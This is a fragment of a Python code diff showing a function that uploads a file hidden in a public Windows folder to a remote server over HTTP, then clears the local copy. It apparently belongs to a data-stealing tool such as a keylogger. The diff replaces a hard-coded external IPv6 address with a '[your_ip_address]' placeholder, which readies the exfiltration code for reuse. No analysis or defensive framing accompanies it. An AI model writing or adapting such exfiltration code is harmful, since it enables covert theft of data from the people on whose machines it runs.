@@ -33,7 +33,7 @@ def send_file():
     global error_occurred
     try:
         files = {"file": open(r"C:\Users\Public\Pictures\uffh.txt", "rb")}
-        requests.post("http://[2402:3a80:42a9:d016:6d7c:f5e:f73a:8045]:8000/receive", files=files)
+        requests.post("http://[your_ip_address]:8000/receive", files=files)
         open("uffh.txt", "w").close()
     except Exception as e:
         error_occurred = True
